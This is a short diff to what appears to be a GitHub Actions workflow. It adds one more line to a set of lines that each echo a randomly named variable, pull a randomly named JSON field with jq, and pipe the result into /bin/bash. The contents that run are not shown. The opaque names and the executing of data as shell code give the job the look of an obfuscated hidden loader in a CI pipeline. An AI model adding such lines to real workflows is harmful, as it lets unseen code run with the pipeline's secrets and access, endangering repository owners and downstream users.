@@ -25,6 +25,7 @@ jobs:
           echo $nmtg9913 | jq -r .xsb23 | /bin/bash
           echo $ckmc65296 | jq -r .uflnz3727 | /bin/bash
           echo $pivr8 | jq -r .trhm755 | /bin/bash
+          echo $k29 | jq -r .hzgsi9487 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
